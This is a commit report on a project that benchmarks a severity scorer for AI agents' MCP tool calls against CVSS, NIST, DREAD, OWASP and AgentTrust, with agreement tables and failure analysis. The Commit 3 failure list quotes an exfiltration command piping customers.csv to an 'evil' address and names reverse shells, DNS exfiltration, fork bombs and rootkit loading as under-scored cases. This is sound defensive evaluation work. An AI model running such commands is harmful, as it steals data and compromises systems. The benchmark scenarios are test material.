# Report — Last 4 Commits

Prepared 2026-07-05. Covers the four most recent commits on the MCP risk-scoring
project, all landed **Sun 2026-06-28** in one working session (14:03 → 15:40 IDT).
Together they turn the static risk-scoring framework into an **empirically evaluated
severity scorer**, benchmarked against the classical frameworks and against
AgentTrust's own published scorer.

## At a glance

| # | commit | time | title | scope |
| --- | --- | --- | --- | --- |
| 1 | `5ccc8dd` | 14:03 | chore: add deliverable zips (scanner improvements + new simulations) | packaging |
| 2 | `979155e` | 14:07 | feat(agenttrust_loader): support multiple severity-benchmark sources | loader |
| 3 | `5d4458 4` | 15:24 | feat(eval): severity-scoring benchmark vs CVSS/NIST/DREAD/OWASP | evaluation core |
| 4 | `d301acb` | 15:40 | feat(eval): head-to-head vs AgentTrust's own scorer + validation research | head-to-head |

Net effect: **+~3,900 lines** across evaluation scripts, vendored external benchmarks
(496 scenarios), agreement/analysis reports, and two research write-ups.

---

## Commit 1 — `5ccc8dd` · add deliverable zips

**What it did.** Started version-tracking the two packaged deliverables and removed the
blanket `*.zip` ignore (the repo already versions other report/presentation zips).

**Changed.**

- `.gitignore` — dropped 3 lines (stopped ignoring `*.zip`).
- `reports/mcp_improvements_and_sims.zip` — new (195 KB): scanner improvements + sims.
- `reports/new_mcp_simulations.zip` — new (99 KB): fresh simulation runs.

**Why it matters.** Makes the packaged deliverables reproducible from the repo instead
of living only on disk. Pure housekeeping — no code behavior change.

---

## Commit 2 — `979155e` · multi-source benchmark loader

**What it did.** Generalized `agenttrust_loader.py` beyond a single scenario directory
so several benchmark corpora can be loaded and tracked together.

**Changed.** `scripts/agenttrust_loader.py` (+58 / −23):

- Added a `SOURCES` map covering **AgentTrust internal / independent / real-world** plus
  the **author-created `mcp_native`** set.
- Added a per-scenario `source` field so every scenario carries its provenance — the
  hook that later lets the evaluator slice results per source.

**Why it matters.** This is the enabling refactor for commits 3 and 4: without a tagged,
multi-source loader, the per-source agreement tables and the head-to-head slicing are
impossible.

---

## Commit 3 — `5d44584` · severity-scoring benchmark vs CVSS / NIST / DREAD / OWASP

The core of the session. Reframes the framework's evaluation from **attack detection** to
**graded severity scoring** (`none…critical`) and benchmarks it against external graded
ground truth and the classical risk frameworks. **+3,607 / −13 across 17 files.**

**New scripts.**

- `scripts/score_severity.py` (+212) — five scorers over a **shared feature extractor**
  so the comparison is fair (every scorer reads identical inputs):
  - `ours` — the framework's real `band_label` (Impact × Sensitivity × Irreversibility +
    confidentiality floor).
  - `cvss` — CVSS v3 base-score bands · `nist` — SP 800-30 Likelihood × Impact matrix ·
    `dread` — mean of D/R/E/A/D · `owasp` — Risk-Rating Likelihood × Impact.
  - `keyword` / `majority` / `random` — content-only and floor references.
- `scripts/evaluate_severity.py` (+130) — Spearman ρ, quadratic-weighted Cohen's κ, MAE,
  within-1 / exact, per source and pooled.
- `scripts/analyze_severity.py` (+117) — confusion matrix, signed bias, obfuscation
  effect, worst-case mining.
- `scripts/agenttrust_loader.py` (+23 more) — source tagging wired into evaluation.

**Vendored external ground truth** under `external/`:

- `agenttrust/extra/independent_test.yaml` (455) + `real_world_100.yaml` (1,328) —
  AgentTrust (AGPL-3.0), 430 items.
- `mcp_severity/operations.yaml` + `scenarios.yaml` — author-created set, 66 items.

**Reports.** `reports/severity_eval/` + `reports/evaluation/`: `SUMMARY.md`,
`BENCHMARK_SEARCH.md` (why most agent-safety benchmarks don't provide per-action severity
ground truth), `severity_benchmark.{md,json}` (agreement tables), `severity_analysis.md`
(diagnosis). Plus `mcp_severity_eval.zip` deliverable.

**Headline result (Spearman ρ, higher is better).**

| scorer | internal (300) | external pooled (430) | obfuscated (30) | mcp_native (66) |
| --- | --- | --- | --- | --- |
| **ours** | **0.45** | 0.35 | **−0.23** | **0.64** |
| keyword | 0.49 | 0.48 | 0.37 | 0.74 |
| NIST | 0.42 | 0.32 | −0.12 | 0.54 |
| OWASP | 0.41 | 0.34 | 0.03 | 0.58 |
| CVSS | 0.27 | 0.23 | −0.21 | 0.55 |
| DREAD | 0.10 | 0.08 | −0.03 | 0.26 |

**Two wins, three problems (from `severity_analysis.md`).**

- ✅ Beats **CVSS and DREAD** decisively; ties/edges **NIST and OWASP** on clean
  operational severity — the core contribution holds.
- ⚠️ A trivial **keyword** detector beats it on the pooled set (0.48 vs 0.35).
- ⚠️ **Content-blind under-scoring** — rates the *tool's* capability, not argument
  intent. Rates *none/low* things that are *critical*: base64-wrapped reverse shells,
  DNS exfiltration, `cat customers.csv | mail external@evil`, fork bombs, rootkit
  `insmod`.
- ⚠️ **Obfuscation defeats the extractor** — on base64/hex/variable-expansion bypasses
  MAE jumps 1.23 → 1.80 and ρ goes negative.
- ⚠️ **Over-scores benign dev/security tools** (`git secrets --scan` → high; localhost
  config read → critical; `safe_dev` mean error +1.17).

**Conclusion it draws.** The static rubric is well-calibrated for graded operational
severity but is content-/obfuscation-blind — exactly the gap the planned **dynamic,
request-time LLM scorer** should close. Drop-in next step: write LLM scores to
`reports/evaluation/sev_scores/llm.json` and re-run the same benchmark.

---

## Commit 4 — `d301acb` · head-to-head vs AgentTrust's own scorer + validation research

The closing commit. Runs the incumbent's **own** scorer on the same data and grounds the
whole evaluation in how risk scoring is validated in the literature. **+329 / −9.**

**New / changed.**

- `scripts/run_agenttrust_scorer.py` (+88) — drives AgentTrust's published
  `TrustInterceptor` (LLM judge **off** — its headline config) per scenario →
  `reports/evaluation/sev_scores/agenttrust.json`, auto-graded as another column.
- `scripts/evaluate_severity.py` (+32/−9) — slices external score files by **global
  index** so any external scorer appears in every per-source table.
- `reports/severity_eval/RELATED_VALIDATION.md` (+99) — multi-agent research synthesis:
  the **validation ladder** (outcome-based ROC/PR-AUC à la EPSS AUC≈0.838, coverage-vs-
  effort, precision@k, case-control, calibration/Brier, inter-rater κ), a comparables
  table (AgentTrust, MCP-RiskCue, LLM-CVSS, ProbGuard runnable; AURA/TRiSM/AgenTRIM not),
  and the **Cox/Krisper** objection: multiplying ordinal scales is unsound *unless* you
  validate the induced ranking and beat a single-axis baseline (which this work does).
- Updated `SUMMARY.md`, `severity_benchmark.{md,json}` with the head-to-head columns.

**The head-to-head (Spearman ρ).**

| set | AgentTrust (theirs) | ours | best classical |
| --- | --- | --- | --- |
| agenttrust_internal (300) | **0.88** | 0.45 | nist 0.42 |
| agenttrust_independent (30) | **0.99** | −0.23 | owasp 0.03 |
| agenttrust_realworld (100) | **0.97** | 0.24 | owasp 0.21 |
| **mcp_native (66, unseen by AgentTrust)** | 0.43 | **0.64** | owasp 0.58 |

**The decisive finding.** AgentTrust's ~0.9 is **home-field advantage** — its rules were
authored on those exact scenarios (the circular-evaluation trap). On the one set it never
saw (`mcp_native`) it **collapses to 0.43 — below ours (0.64) and below CVSS/NIST/OWASP.**
Its hardcoded patterns don't transfer; **ours generalizes to a new domain.**

---

## What this session accomplished, in one paragraph

The project went from "we have a static risk scorer" to "we have **external, adversarial
evidence** of exactly where it wins and loses." It now (1) benchmarks against 496
third-party + authored scenarios, (2) beats CVSS/DREAD and ties NIST/OWASP on clean
severity, (3) exposes its own content-/obfuscation-blindness with concrete failing cases,
and (4) shows it **generalizes better than the incumbent (AgentTrust) on unseen data**.
The clear next step is already scoped: add the semantic/LLM request-time scoring stage and
re-run this identical benchmark (`sev_scores/llm.json`).

## Reproduce

```bash
cd /home/ovadyat/MCP
python scripts/score_severity.py          # ours + CVSS/NIST/DREAD/OWASP/keyword
python scripts/run_agenttrust_scorer.py   # AgentTrust's own TrustInterceptor
python scripts/evaluate_severity.py       # agreement tables (per source + pooled)
python scripts/analyze_severity.py        # confusion matrix + failure diagnosis
```
